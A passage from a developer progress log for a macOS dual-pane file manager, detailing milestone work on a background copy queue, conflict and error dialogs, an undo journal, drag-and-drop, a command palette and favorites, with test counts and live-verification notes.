queue-bar / drop-through-queue pass), so it's tested-but-dormant, matching how the engine
landed before its app shell.

- **Core scheduler** (`DirnexCore/…/Operations/FileOperationQueue.swift` +
  `QueueSnapshot.swift`, new). A `public actor` — named `FileOperationQueue` only to dodge
  `Foundation.OperationQueue` — that owns a FIFO of jobs (`FileOperation` + `ConflictPolicy`)
  and runs each through `CopyEngine.run` on a detached task, so the actor itself only
  bookkeeps and never blocks on I/O.
  - **Volume-aware scheduling.** Each job's volume set = every source's volume ∪ the
    destination's, resolved via a new `VFSBackend.volumeIdentifier(for:)` (defaulted `nil`
    = "one volume, serialize"; `LocalBackend` returns the `st_dev` of the nearest existing
    ancestor, following symlinks). `pump()` greedily launches the first waiting job whose
    volumes are disjoint from every running job's — so same-disk jobs serialize (no head
    thrashing) while independent disks run concurrently, FIFO within a volume. A
    `maxConcurrent` cap (default 8) backstops many-volume machines.
  - **Pause/resume that actually parks running transfers.** A per-job `JobControl`
    (`NSCondition`-backed, `@unchecked Sendable`) is handed to the engine as its
    `isCancelled` hook via `checkpoint()`: it reports cancellation *and*, while the queue is
    paused, blocks the copy thread between chunks until resume or cancel. So pause halts new
    dispatch *and* freezes in-flight copies — with zero changes to `CopyEngine`, which
    already polls `isCancelled` between chunks/items.
  - **Cancel** one job (waiting → dropped pre-start; running → engine unwinds through its
    normal cancel, partial file cleaned up, reports `wasCancelled`) or `cancelAll()`.
  - **Live progress.** `observe()` fans out an `AsyncStream<QueueSnapshot>` (current state
    immediately, then on every change); `snapshot()` is the one-shot read; `waitUntilIdle()`
    suspends until drained. `AggregateProgress` rolls up bytes across jobs and derives
    throughput + ETA from the average rate since the batch started moving (clock injected
    for testability); still-waiting jobs count 0 bytes, so the total is an estimate early
    and exact once nothing's waiting.
- **Tests** (`FileOperationQueueTests`, +7 → core suite **106**, all green;
  swiftformat/swiftlint-strict clean; app still builds). Scheduling is made deterministic by
  a `GatedBackend` whose clone blocks in a test-controlled rendezvous (not a sleep-race):
  serial-per-volume (only one of two same-volume jobs runs, the second starts only once the
  first is released), concurrent-across-volumes (two disjoint-volume jobs reach the gate at
  once), pause-halts-dispatch (+ a running job flips to `.paused`, and a newly-enqueued
  independent-volume job stays put until resume), cancel-waiting (never enters the gate, no
  report), cancel-running (via a `BlockingCopyBackend` that spins on the cancel hook →
  `wasCancelled`), single-job happy path, and the `observe()` stream. GOTCHA for the next
  pass: the queue is headless and unused by the app — F5/F6 still run the standalone
  `CopyEngine` behind the single-op sheet; routing them (and drag-drop) through this queue,
  plus the queue-bar UI, is the wiring pass.

Progress (2026-07-06, M2 pass 5): the `newer-only` conflict policy landed — TC's
"overwrite older", closing one of the two named conflict-engine gaps ("apply to all" +
the rich dialog remain). Core-only decision site: `ConflictPolicy.newerOnly` (new case)
resolves in `CopyEngine.resolveConflict`, which now captures the existing destination's
`stat` and replaces it only when `source.modificationDate > existing.modificationDate`,
else skips (equal counts as not-newer → skip). It reuses the existing temp-sibling
overwrite plan (factored into a shared `overwritePlan(at:name:)`), so the atomic-swap
safety is unchanged; the comparison is on the top-level item's own mtime, so a directory
is replaced wholesale when *its* mtime is newer (a per-file merge is a later pass). The
app's F5/F6 conflict prompt gains an **Overwrite If Newer** button (appended before Cancel
so the existing overwrite/keep-both/skip response mappings are untouched; the 4th button's
response code is derived from `.alertThirdButtonReturn + 1`). Tests: the conflict-policy
matrix moved out of `CopyEngineTests` into a focused `CopyEngineConflictTests` suite (kept
the growing file under SwiftLint's `type_body_length`), which adds 3 `newerOnly` cases
(replaces-older / keeps-newer / skips-equal) on top of the existing four; a new
`TempTree.setModificationDate` helper stamps mtimes deterministically. Core suite now
**109 tests**, all green; app builds clean; touched files swiftformat/swiftlint-strict
clean. Not yet verified live (headless + a menu-button wiring; the engine path is fully
unit-covered). GOTCHA for the next pass: newer-only is exposed only through the up-front
single-policy prompt — it'll want re-surfacing per-file once the rich "apply to all"
dialog lands.

Progress (2026-07-06, M2 pass 6): the app is now **wired to the operation queue** — the
dormant `FileOperationQueue` from pass 4 is live, and F5/F6 run through it behind a
non-blocking, window-bottom queue bar instead of the old modal progress sheet (which is
deleted). This is the pass that makes copies TC-style background work.

- **Core** (`FileOperationQueue`): one small addition, `clearFinished()` — drops terminal
  (finished/cancelled) jobs, leaving waiting/running/paused ones. The aggregate rolls up
  *all* known jobs, so without this a later batch would inherit the bytes of jobs already
  done and its bar would start part-full; the app calls it once the queue drains. To stay
  under SwiftLint's `type_body_length` (the addition pushed the actor body to 252 > 250 —
  recurring gotcha), the snapshots/observation/aggregate methods moved to an
  `extension FileOperationQueue` in the same file (still actor-isolated). Tests +2 →
  **111 core** (clearFinished resets the aggregate; keeps a still-running job).
- **App.** One shared `FileOperationQueue` lives on `BrowserWindowController`, keyed off
  the same `LocalBackend` both panes use (so volume-aware scheduling works). New
  `PanelHost.enqueue(_:conflictPolicy:)` is fire-and-forget; `PanelViewController+Copy`
  keeps the up-front conflict prompt (Overwrite / Keep Both / Skip / Overwrite If Newer /
  Cancel) then hands the operation to the queue and clears its own marks. The window
  controller drains `queue.observe()` for the window's lifetime (task cancelled in `deinit`;
  `[weak self]` + per-iteration re-bind avoids pinning the window alive) and, per snapshot:
  shows/collapses the bar, re-lists **both** panes as each job reaches a terminal state
  (dedup'd via a `finalizedJobs` set), surfaces failures, and `clearFinished()`s on drain.
  New `QueueBarView` (own file) renders from a `QueueSnapshot` and knows nothing of the
  actor: "Copying X" + determinate bar + "done of total · rate/s · ETA left", a pause/resume
  toggle (SF Symbol flips play↔pause; drops rate/ETA while paused), and cancel-all. Layout:
  a container VC stacks the split view over the bar; the bar collapses to zero height and
  hides when idle. `OperationProgressSheet.swift` deleted. App builds clean, whole repo
  `swiftformat --lint` + `swiftlint --strict` clean.
- **Verified live via computer-use** (no LanguageTool overlay this session — mouse worked;
  seeded both panes at a fixture via the tab-persistence data-blob, and mounted a 6 GB APFS
  disk image as a *second volume* so cross-volume copies take the chunked byte-path and the
  bar lingers): a same-volume clone of `big.bin` was instant (bar flashed, dest refreshed);
  a 3.67 GB cross-volume copy of `huge.bin` showed the bar live — "Copying huge.bin",
  determinate bar, "1.84 GB of 3.67 GB · 1.27 GB/s · 1s left" — with browsing fully
  responsive, then dest auto-refreshed and the bar collapsed; the file was byte-exact on
  disk. **Pause** froze the transfer at 1.74 GB (identical across a 2 s gap — genuinely
  parked, not just relabelled), flipped the button to play, and dropped rate/ETA;
  **resume** finished it, byte-exact (pause/resume didn't corrupt). The conflict prompt
  also surfaced correctly on a re-copy, showing all five options incl. "Overwrite If Newer".
  (Cancel-all button is core-unit-tested — cancel-waiting/cancel-running — and renders; not
  clicked live. Move/F6 uses the identical enqueue path and was verified live in pass 2.)
  GOTCHA (tooling): a same-volume APFS clone is O(1), so the bar flashes too fast to catch
  across model round-trips — to observe it you need a real cross-volume (chunked) transfer,
  and to land an interactive pause/cancel click you must do it *inside one computer_batch*
  (server-side, no round-trip latency) or the sub-3 s transfer finishes first.

Progress (2026-07-06, M2 pass 7): drop *in* landed — dragging files onto a pane is now a
real copy/move through the shared queue, the receiving half of pass 11's drag-*out*
(app-target only; `DirnexCore` untouched, still 111 tests). Files can arrive from the
other pane, from the same pane onto a subfolder, or from an external app (Finder).

- **App wiring.** `configureDragging` (`PanelViewController+Drag`) now also
  `registerForDraggedTypes([.fileURL])` and widens the *local* drag-source mask from `[]`
  to `[.copy, .move]` (external stays `.copy`-only, so a drag out can never move/delete the
  original). New `PanelViewController+Drop.swift` implements the receiving
  `NSTableViewDataSource` drop methods. A single `dropPlan(_:row:dropOperation:)` — computed
  identically in `validateDrop` (for the cursor badge + row highlight) and `acceptDrop`
  (for the real work) — resolves: the **destination** (a directory row released *on* → into
  that folder, incl. the `..` row → move up a level; else the pane's current dir, with the
  whole pane highlighted via `setDropRow(-1, .on)`); the **kind** (Finder conventions:
  Option forces copy, Command forces move, else move within a volume / copy across volumes,
  read from `NSDragOperation` + `NSEvent.modifierFlags` since a *local* drag's source mask
  ignores modifiers; same-volume decided cheaply via `volumeIdentifier` on the first
  source); and two **guards** — reject a no-op (every dropped item already lives in the
  destination, e.g. a pane's own files onto its own background) and reject a folder dropped
  onto itself or into its own subtree (would recurse). `acceptDrop` returns `true`
  immediately, then off-main `stat`s the dropped URLs into `[FileEntry]` and hands them to
  the **shared** `submitTransfer(kind:sources:destination:)` — factored out of
  `PanelViewController+Copy`'s F5/F6 flow (which now calls it and only clears its own marks
  when it returns `true`, preserving the exact cancel-at-prompt behavior). So conflict
  handling, progress (queue bar), and the both-panes refresh are identical to F5/F6; a drop
  also makes the target pane active (focus-follows-drop). App builds clean; whole repo
  swiftformat/swiftlint-strict clean; app smoke test green.
- **Verified live via computer-use** (no LanguageTool overlay this session — mouse worked;
  seeded both panes at a `~/dropfix-verify/{left,right}` fixture via the tab-persistence
  data-blob; manual drags = `left_mouse_down` → several `mouse_move`s → dwell →
  `left_mouse_up`, all in one `computer_batch`): dragging `alpha.txt` left→right defaulted
  to a **move** (gone from left, present in right, byte-exact); dragging the `subdir` folder
  onto the right pane's `target` **folder row** highlighted that row green mid-drag and moved
  `subdir/nested.txt` recursively *into* `right/target/`; dropping a colliding `beta.txt`
  raised the shared **conflict prompt** (all five buttons incl. Overwrite If Newer), and
  **Keep Both** produced `beta copy.txt` while preserving the destination's original
  `beta.txt` — all confirmed on disk. GOTCHA: Option=copy and the cross-volume copy default
  are correct by inspection but unverified-live — this harness can't hold a modifier across a
  synthetic manual drag, and the machine has only one browsable volume (would need a mounted
  disk image, as in pass 6). NEXT M2: rich per-file conflict dialog ("apply to all"), undo
  journal, expandable per-job queue-bar list.

Progress (2026-07-06, M2 pass 8): copy/move engine test hardening — closed the three
failure-mode gaps PLAN §5 mandates for every operation but the happy-path/conflict suites
never reached: **permission denied**, **disk full** (`ENOSPC`), and **source mutated
during the op**. Core-only (`DirnexCore`); no production code changed. New
`CopyEngineFailureTests` (7 tests → core suite **118**, all green;
swiftformat/swiftlint-strict clean). The safety theme: a failed item is *collected* and
the op carries on, a failed copy never deletes the source it was moving or the destination
it was overwriting, and a half-written file is never left behind.

- **Test double.** One `FaultBackend` wrapper generalizes the `NoCloneBackend`/
  `CrossVolumeBackend` pattern (block clone → force the chunked path; report `EXDEV`;
  fail `copyFile` for chosen sources; run a side effect just before a copy to mutate the
  source under the engine), so out-of-space and permission conditions are injected
  deterministically rather than needing a real full/locked volume — the same call the
  existing suites make for `EXDEV`.
- **Coverage.** permission-denied on one source is collected while the others still copy
  (+ a real `chmod 000` source, `getuid`-guarded, so the POSIX `EACCES → .permissionDenied`
  mapping is covered end to end); a disk-full copy during a **cross-volume move keeps the
  source**; a disk-full **overwrite keeps the existing destination and leaves no temp
  sibling** (the atomic-swap guarantee); a **mid-file cancel unlinks the partial**
  destination (the real `LocalBackend.copyFile` close+unlink path, which the prior
  cancel-before-work test never reached); a **vanished source** is recorded as `.notFound`
  and the op continues; a source **appended-to mid-copy is copied in full** (the engine
  streams to EOF, not to the pre-scanned length).
- GOTCHA surfaced (not fixed — production behavior left untouched): on the **clone** fast
  path `LocalBackend.cloneItem` maps *every* `clonefile` errno to `path: destination`, so a
  vanished/unreadable **source** surfaces as an error about the **destination** path
  (`.notFound(dest/x)` not `.notFound(src/x)`). The `.alreadyExists` (EEXIST) attribution is
  correctly destination-side and the app relies on it, so the test asserts the failure
  *case*, not the incidental path. A minor diagnostic-message inaccuracy worth revisiting
  when the rich conflict/error dialog lands.

Progress (2026-07-07, M2 pass 9): the undo journal landed — Cmd+Z reverses the five
reversible operations and delete-to-Trash restore, and the journal survives relaunch. Undo
is "the scariest feature" (§5), so the byte-touching reversal lives in `DirnexCore` under
property tests; the app is the thin shell that records completed ops and drives `revert`.

- **Core** (`DirnexCore/…/Operations/UndoJournal.swift`, new). An `UndoRecord` is a
  user-facing label + a list of inverse `UndoStep`s (`restore(from:to:)` /
  `removeCopy` / `removeCreatedFolder`) + a `nonReversibleCount`. `UndoJournal` is a bounded
  newest-on-top stack (`record`/`removeTop`, capacity 50); `UndoJournal.revert(_:using:)` is
  the executor — it refuses to clobber a reoccupied original, protects a New-Folder undo when
  the user has since filled the folder, and (for a cross-volume move) reverses copy-then-delete
  through `CopyEngine`. The copy/move builder reads the **engine's new per-item outcomes**:
  `CopyEngine` now records each top-level source's landing path + whether it overwrote, added
  as `OperationReport.outcomes` (`OperationItemOutcome`); `UndoRecord.transfer` turns a copy
  into `removeCopy`s, a move into `restore`s, and an **overwrite into a counted, non-reversible
  item never silently deleted**. `VFSPath`/`VFSBackendID` gained `Codable` (routing decode
  through the normalizing init) so records persist. New `UndoJournalTests` (13) prove the
  headline property `op + undo == original tree` for copy/move (incl. cross-volume)/rename/
  New-Folder/Trash-restore, plus the overwrite/skip/clobber/capacity/JSON-round-trip edges —
  **core suite 131 tests**, all green; swiftformat/swiftlint-strict clean.
- **App wiring.** New `UndoController` (per window on `BrowserWindowController`) owns the
  journal, persists `records` as JSON in `UserDefaults` (matching `TabPersistence`; the plan's
  SQLite earns its keep once undo shares the M3 frecency DB), and runs `revert` off-main.
  New Folder / rename / Trash record through a new `PanelHost.recordUndoableAction`; copy/move
  record in `BrowserWindowController+Queue` as their queue jobs finish (so drag-drop is covered
  for free). A new **Edit ▸ Undo (Cmd+Z)** dispatches through the responder chain to the focused
  pane's `undoLastOperation` → the window's controller; `validateMenuItem` sets the live title
  ("Undo Move") and **steps aside for an active field editor** so inline-rename/path-bar typing
  keeps its own undo (a disabled item lets `performKeyEquivalent` fall through). A less-than-clean
  undo (non-reversible parts, or a step that couldn't apply) raises a summary sheet; a clean one
  is silent. App builds clean; app smoke test green.
- **Verified live via computer-use** (menu- and Cmd+Z-driven; the Command modifier came through
  this session): seeded a two-file fixture into both panes. **Move** alpha→right then Edit ▸
  Undo (menu showed "Undo Move") restored it byte-exact; **New Folder** then **Cmd+Z** removed
  the empty folder; **Move to Trash** then **Cmd+Z** restored alpha from the Trash; and — the
  relaunch test — a move, graceful quit, relaunch (journal reloaded, menu still read "Undo
  Move"), Cmd+Z reversed it. Every step confirmed on disk. NEXT M2: rich per-file conflict
  dialog ("apply to all"), expandable per-job queue-bar list, per-file skip/retry/abort.

Progress (2026-07-07, M2 pass 10): the queue bar's **expandable per-job list** landed —
the last open piece of §M2's Progress-UI line (app-target only; `DirnexCore` untouched,
still 131 tests). The compact aggregate row gained a disclosure chevron; expanding it
reveals a scrollable list of one row per in-flight/waiting job — verb + item name, its own
determinate progress bar, a byte readout, and a per-job cancel button — all rendered from
the `QueueSnapshot.jobs` the window already receives, so there was **no core change**
(the per-item data was published back in pass 4).

- **App wiring.** New `QueueJobRowView` (own file) renders a single `JobSnapshot`.
  `QueueBarView` grew a disclosure header over a bottom `NSScrollView` + vertical
  `NSStackView` list; it reconciles rows against each snapshot (a fast path updates the
  existing rows in place when the job set/order is unchanged, else it rebuilds) and reports
  a dynamic `preferredHeight` (collapsed 42 → header + up to 5 rows, more scroll) through a
  new `onPreferredHeightChanged` callback so `BrowserWindowController` grows/shrinks the
  window-bottom band. A per-row cancel routes through a new `onCancelJob` → the window's
  `cancelJob(id)` → `queue.cancel(id)` (the actor's existing per-job cancel from pass 4).
  The job-list-height constraint drives the internal layout — the header fills the fixed
  top band above the scroll area — so the collapsed/hidden case is identical to the prior
  bar. App builds clean; touched files swiftformat/swiftlint-strict clean; app test target
  green; launching the built binary showed **no Auto Layout conflicts** (collapsed layout
  verified). NOT yet driven live in the UI: expanding the list *during* an in-flight
  transfer needs the pass-6/7 cross-volume disk-image setup to keep the bar on screen long
  enough — the collapsed-layout launch check passed and the per-job data path is the one
  pass 6 already verified live. NEXT M2: rich per-file conflict dialog ("apply to all") and
  per-file skip/retry/abort (both need the engine to yield control mid-operation).

Progress (2026-07-07, M2 pass 11): the **rich per-file conflict dialog with "apply to
all"** landed — the last open piece of §M2's conflict engine. The engine now *yields
control mid-operation* (the recurring blocker the prior passes flagged): instead of a
single up-front policy, F5/F6/drop enqueue under a new `ConflictPolicy.ask` and the engine
calls back into the app per colliding item, so the user resolves each conflict against a
side-by-side comparison.

- **Core** (`DirnexCore`, +7 tests → **138**). `ConflictPolicy` gained `.ask`; new value
  types `ConflictContext` (the operation kind + the incoming `source` and the `existing`
  destination `FileEntry`) and `ConflictResolution` (overwrite / overwriteIfNewer / skip /
  keepBoth / **cancel** = abort the whole op). `CopyEngine.run` takes an optional
  `resolveConflict: @Sendable (ConflictContext) -> ConflictResolution`; when the policy is
  `.ask` and a destination is occupied, it calls the resolver **synchronously on the copy
  thread** (never for a non-colliding source) and maps the answer onto the existing
  temp-swap / keep-both / newer-only plans — `.cancel` throws `CancellationError`, unwinding
  through the same path as a mid-copy cancel (`wasCancelled`, already-done items kept). A
  missing resolver degrades to `.fail` (never clobbers). `FileOperationQueue.enqueue`
  threads the resolver into the job and on to `CopyEngine.run`. New `CopyEngineAskTests`
  cover each resolution, "only colliding sources ask", cancel-aborts-the-batch, and the
  no-resolver fallback. The engine's serial top-level processing means the resolver is
  called one conflict at a time, so "apply to all" is a pure caller concern (see below).
- **App** (`Dirnex/Dialogs/`, new group per §3). `ConflictPrompter` (`@unchecked Sendable`,
  one per enqueued op) is the bridge: the engine's copy-thread callback blocks on a
  `DispatchSemaphore` while a `Task { @MainActor }` runs `ConflictDialog.present`, then reads
  the answer back across the semaphore — the same background-parks-on-a-primitive shape the
  queue already uses for pause (`JobControl.checkpoint`), so no `CopyEngine` change was
  needed. A ticked **"Apply to all remaining conflicts"** stores a sticky `ConflictResolution`
  (touched only on the single copy thread) that answers every later conflict without a
  prompt — scoped to that one operation, like TC's "Overwrite all". `ConflictDialog` is an
  `NSAlert` sheet with a `ConflictComparisonView` accessory: two cards (New vs. Already here)
  each showing a **Quick Look thumbnail** (`QLThumbnailGenerator`, images preview / text a
  content peek; falls back to the workspace icon), name, size-or-"Folder", and modification
  date with the **newer item's date tinted**; buttons Replace / Keep Both / Skip / Replace If
  Newer / Cancel + the suppression checkbox. `PanelViewController+Copy.submitTransfer` was
  rewritten to build a prompter and enqueue with `.ask` (dropping the old up-front
  detect-then-single-prompt); `PanelHost.enqueue` / `BrowserWindowController+Queue` grew the
  resolver parameter; drag-drop is covered for free (it already routes through
  `submitTransfer`). App builds clean; whole repo swiftformat/swiftlint-strict clean.
- **Verified live via computer-use** (seeded both panes at a `~/conflict-verify/{left,right}`
  fixture where every name collides, left files newer): copying `report.txt` raised the rich
  dialog — both cards with thumbnails (the QL previews even showed the file text), "19 bytes
  · 01.07.2026 · newer" tinted vs. "5 bytes · 01.01.2026", the queue bar parked at "Copying
  re…" behind it — and **Replace** overwrote it byte-exact leaving `notes.txt` untouched, no
  temp detritus; marking **both** files then **Apply to all + Replace** overwrote both from a
  **single** dialog (no second prompt); **Keep Both** produced `report copy.txt` while keeping
  the original. Backgrounding the app mid-dialog left the copy thread parked (no crash, no
  deadlock) and the sheet resumed on refocus. GOTCHA: full side-by-side text *diff* is still
  deferred — the thumbnails cover the common visual case; per-file skip/retry/abort remains
  the last conflict-adjacent M2 item.

Progress (2026-07-07, M2 pass 12): **per-file skip/retry/abort on errors** landed — the last
open item of §M2's Errors line. The engine now *yields on failure* the same way pass 11 made it
yield on conflict: instead of always collecting a failed source and moving on, it hands the
error to a resolver that can Retry the item, Skip it, or Abort the whole op.

- **Core** (`DirnexCore`, +6 tests → **144**). New value types `OperationErrorContext` (op kind +
  failing `path` + `VFSError`) and `ErrorResolution` (retry / skip / abort). `CopyEngine.run` gained
  an optional `onError: @Sendable (OperationErrorContext) -> ErrorResolution`; `transfer` was
  refactored into an `attempt`-and-retry loop that, on a caught `VFSError`, rolls back the failed
  attempt's partial bytes (so a retried copy never double-counts) and consults `onError`: `.retry`
  re-runs the source, `.skip` collects the failure and continues (**the default when no resolver**,
  so every existing failure test and unattended run is unchanged), `.abort` unwinds like a mid-copy
  cancel (`wasCancelled`, no failure appended — the user already saw it). `FileOperationQueue.enqueue`
  threads `onError` into the job and on to the engine. The conflict-resolution helpers moved to a
  `private extension CopyRun` to keep the class under `type_body_length`. New `CopyEngineErrorTests`
  cover skip-collects-and-continues, retry-after-transient-fault (asserting bytes tallied once),
  retry-N-times-then-skip, abort-unwinds, abort-keeps-earlier-work, and the no-resolver default,
  driven by a `MutableFaultBackend` that fails `copyFile` for a chosen name a fixed number of times.
- **App** (`Dirnex/Dialogs/`). New `ErrorPrompter` (sibling of `ConflictPrompter`: same
  copy-thread-parks-on-a-`DispatchSemaphore` bridge, an "apply to all" that is sticky **only for
  Skip** — a sticky Retry would spin forever, Abort ends the op) and `ErrorDialog` (`NSAlert` sheet,
  Retry [default] / Skip / Abort + a suppression checkbox, message from a shared `VFSErrorText`
  extracted out of `PanelViewController.describe`). `PanelHost.enqueue` /
  `BrowserWindowController+Queue.enqueue` / `submitTransfer` gained the `onError` parameter, so F5/F6
  **and** drag-drop all raise it. The window's end-of-op `reportFailures` summary still fires for the
  Skip case; Abort stays silent (empty failures). Whole repo swiftformat/swiftlint-strict clean.
- **Verified live via computer-use** (a `~/dirnex-err-verify/{src,dst}` fixture with `dst` chmod
  `0555` so a copy into it hits EACCES): F5 of `payload.txt` raised "Couldn't copy 'payload.txt'"
  with the permission text, the apply-to-all checkbox, Retry/Skip/Abort, and the queue bar parked at
  "Copying payload.txt · Zero KB of 13 bytes" behind it. **Retry** after `chmod 0755`-ing `dst`
  mid-sheet (the copy thread was parked) completed byte-exact (`cmp` IDENTICAL). **Abort** on a
  re-locked `dst` was silent — no summary, queue bar gone, nothing copied. **Skip** collected the
  failure and surfaced the end-of-op "Couldn't copy 'other.txt'" summary. **§M2's Errors line is now
  `[x]`.** Deferred: sub-item granularity (an error deep in a recursive directory copy still fails the
  whole top-level source, not the individual child) and a full text diff in the conflict dialog.

Progress (2026-07-07, interlude — **Finder-style mouse selection**, outside the M-numbering):
Cmd/Shift-click marking that drives the *same* mark set as the TC keyboard gestures (marks render
bold red; the cursor stays the blue row highlight — deliberately no `NSTableView` multi-select, one
selection concept). **A plain click does not mark** — the user asked for exactly that, so a plain
click only moves the cursor (via `super.mouseDown`) and re-anchors the range for a later Shift-click;
operations still fall back to the cursor entry when nothing is marked. Core `Panel` gained two tested
primitives: `toggleMarkMovingCursor(to:)` (Cmd-click) and `selectRange(from:through:base:)`
(Shift-click — it unions the inclusive run onto `base`, the marks predating the sweep, so re-sweeping
from one anchor replaces only the run and a Shift-after-Cmd keeps out-of-range marks). App:
`FileTableView.mouseDown` routes clicks through a new `fileTable(_:didClickRow:modifiers:)` — Cmd/Shift
consumed (returns true, no `super`, so no cursor-move or drag) plus `makeFirstResponder(self)` so a
modifier-click on the *inactive* pane still activates it; a plain click returns false so `super`
still runs cursor-move and drag-out. The anchor/base state (`mouseSelectionAnchor`,
`mouseSelectionBase`) is view-only, identity-keyed, reset on navigate and on Esc-clear, and lives in
a new `PanelViewController+MouseSelect.swift`; `PathBarViewDelegate` moved to
`PanelViewController+PathBar.swift` to keep the controller under the 500-line ceiling. **148 core
tests** (+4 `PanelTests`). Verified live before *and* after the plain-click change: plain click leaves
the count untouched yet still anchors a following Shift-click (Documents→Music = "5 of 18"); Cmd-click
toggles; a plain click after marking keeps the marks; a Cmd-click in the inactive pane activates it.
Esc-clear could not be exercised (the recurring synthetic-⎋ gotcha).

Exit: 50 GB copy runs in background while browsing stays 60fps; yanking a USB drive
mid-copy produces a sane error, not a hang; Cmd+Z after a bad move actually fixes it.

### M3 — Discoverability layer (M)

Goal: fix TC's adoption problem — nobody should need the manual.

- [x] Cmd+K command palette: fuzzy search over every action, shows shortcuts,
      recents on top; palette actions and menu bar generated from one action registry ✅
- [x] Directory favorites (Ctrl+D): pin, reorder, jump ✅
- [x] Per-panel history (Alt+Down list; Cmd+[ / Cmd+] back/forward) ✅
- [x] Frecency jump: visit tracking; path bar accepts fuzzy fragments
      ("dl" → ~/Downloads), zoxide-style scoring ✅ (JSON store; SQLite deferred like undo)
- [x] Workspaces: save/restore both panels with all tabs, named, switchable from palette ✅
      (JSON store; per-workspace palette entries deferred — surfaced via the "Workspaces…" popup)
- [x] Settings window (SwiftUI): general, panels, operations, shortcuts ✅
- [x] Rebindable shortcuts with conflict detection; TC-compatible preset and macOS preset ✅

Progress (2026-07-08, M3 pass 1): the **action registry + Cmd+K command palette** landed —
M3's headline, and the piece the rest of M3 leans on. The registry is one headless source
of truth; both the menu bar and the palette are generated from it, so they can't drift.

- **Core** (`DirnexCore/…/Services/`, new group per §2). `Command` (stable dotted `id` +
  title + `CommandCategory` + search `keywords` + optional `CommandShortcut`) is a pure value
  type — no AppKit. `CommandShortcut` carries a display token + a modifier `OptionSet` and
  renders a macOS glyph string (`⌘Z`, `⇧F8`, `⌘↑`; the `fn` layer is never drawn).
  `CommandCatalog.all` is the ordered registry of ~22 commands (the whole current menu surface
  incl. F5/F6/F2/F7/F8, tabs, undo, select-by-pattern, sidebar, Quick Look, Go-to-Location,
  Go-Up, window/app). `CommandMatcher.search` fuzzy-ranks for the palette: fzf-lite subsequence
  scoring (word-boundary + consecutive-run + prefix bonuses, gap penalty), title preferred over
  a keyword-only hit, empty query → registry order with **recents floated on top**, recency as
  the tie-break; returns matched title offsets for highlighting. New `CommandCatalogTests` /
  `CommandMatcherTests` / shortcut-display tests (+16 → **core suite 164**), all green,
  swiftformat/swiftlint-strict clean.
- **App.** `Dirnex/Palette/` = `CommandBinding` (the join table: command `id` → AppKit
  `Selector`, every one dispatched to `nil` so it rides the responder chain to the focused
  pane / key window / app exactly as a menu item does), `CommandShortcut+AppKit` (token →
  key-equivalent scalar incl. F-keys/arrows + modifier mask), `CommandRecents` (newest-first
  ids in `UserDefaults`, capped, registry-filtered), and the palette itself:
  `CommandPaletteController` (a floating `NSPanel`; a large search field stays first responder
  and drives the result `NSTableView` from `control(_:doCommandBy:)` — ↑/↓ move, ⏎ runs, ⎋
  closes; picking a command records it recent, dismisses, re-keys the browser window, then
  `NSApp.sendAction(_:to:nil)` on the next tick so the action lands on the pane, not the closed
  palette) + `CommandPaletteRowView` (category tag · title with matched chars bold · shortcut).
  New `MainMenuBuilder` rebuilds the whole menu bar from `CommandCatalog` + `CommandBinding`
  (app owns only the per-menu layout/separators; titles/shortcuts/actions all come from the
  registry) — the hand-built menu in `AppDelegate` is gone; a new **Go** menu (Go to Location,
  Go Up) joins File/Edit/Select/View/Window. Three thin `@objc` wrappers
  (`PanelViewController+Commands`: Quick Look / edit-location / go-parent) expose the previously
  keyboard-only actions to the registry; `validateMenuItem` disables Go Up at a backend root.
  ⌘K is owned by `AppDelegate.showCommandPalette` (toggles). App builds clean; whole repo
  swiftlint-strict clean; app smoke target green.
- **Verified live via computer-use**: ⌘K opened the palette (empty resting state, correct
  ⌘T/F5/F2/⇧F8/⌘Z glyphs + category tags); "gotoloc" fuzzy-narrowed to **Go to Location…**
  with "Go to Loc" bold; ↓↓ moved the highlight; ⏎ dispatched to the **focused** pane (Go to
  Location opened its path-bar editor; a separate "newtab" run added a 2nd tab to the left
  pane) — proving the close→re-key→responder-chain path; reopening floated the just-run
  commands to the top (**recents persist across relaunch**); the reused field clears on reopen
  (fixed a stale-query bug caught live); ⌘K toggles the palette closed and a click into the
  window dismisses it; the File menu is fully registry-generated (right separators + F-keys)
  and ⌘T/⌘W still fire. GOTCHA (unchanged from M1/M2): synthetic ⎋ is swallowed by the OS
  before reaching the app, so ⎋-to-close is correct-by-implementation but unverified-live —
  the ⌘K-toggle and click-away dismissals cover it. NEXT M3: favorites (Ctrl+D), per-panel
  history, frecency jump, workspaces, Settings, rebindable shortcuts (the registry's
  `CommandShortcut` is already the data those last two will edit).

Progress (2026-07-08, M3 pass 2): the **directory favorites (Ctrl+D)** landed — TC's pinned-
folder popup, the second M3 item. Pin / jump / reorder all work, and the whole thing hangs
off the same command registry as pass 1.

- **Core** (`DirnexCore/…/Services/Favorites.swift`, new). A pure value type: `FavoriteEntry`
  (user-editable `name` + `VFSPath`, `Codable`, identity = path) and `Favorites` (ordered,
  de-duplicated-by-path list) with `add` (append unless already pinned → no-op, returns
  whether added), `remove(path:)`/`remove(at:)`, `rename(path:to:)`, `move(from:to:)`
  (Array-semantics reorder), and `contains`. Decoding routes through the de-duping init so a
  legacy/corrupt store is sanitized on load. No AppKit, no persistence — the app owns those,
  matching `Panel`/`SidebarLocations`/the command registry. `CommandCatalog` gains two
  navigation commands: `go.favorites` ("Favorites…", ⌃D) and `go.addToFavorites` ("Add
  to Favorites", palette-only). New `FavoritesTests` (+10 → **core suite 174**), all green;
  swiftformat/swiftlint-strict clean. GOTCHA (recurring): a `mutating` call can't live inside
  `#expect(...)` — the macro captures the receiver as immutable — so `add`/`remove` results
  are hoisted into a `let` first ([[swift-testing-expect-optional-arithmetic]]-adjacent).
- **App.** `FavoritesStore` (UserDefaults JSON, one app-wide list, read fresh each menu open —
  no live-observation plumbing, like `TabPersistence`/`CommandRecents`).
  `PanelViewController+Favorites` owns the pane-relative actions dispatched through the
  responder chain: `showFavorites` pops an `NSMenu` from the path bar's bottom edge (one item
  per pin with a Finder folder icon + a bare 1–9 accelerator, then Add/Remove-Current-Folder
  toggle + Organize…); `addToFavorites` pins the current dir; a jump reads the target off the
  item's `representedObject` (index-shift-proof) and, for a vanished `.local` pin, offers to
  unpin it instead of dropping onto a load-failure sheet. `FavoritesOrganizerController` (new)
  is the reorder editor — an `NSViewController` sheet (`presentAsSheet`, self-retaining) with
  a drag-reorderable, inline-renameable, `−`-removable `NSTableView`; every edit saves to the
  store immediately. `CommandBinding`/`MainMenuBuilder` wire the two commands into the Go
  menu; `validateMenuItem` disables ⌃D while a text field is first responder so it falls
  through to the field editor's delete-forward. App builds clean; touched + new files
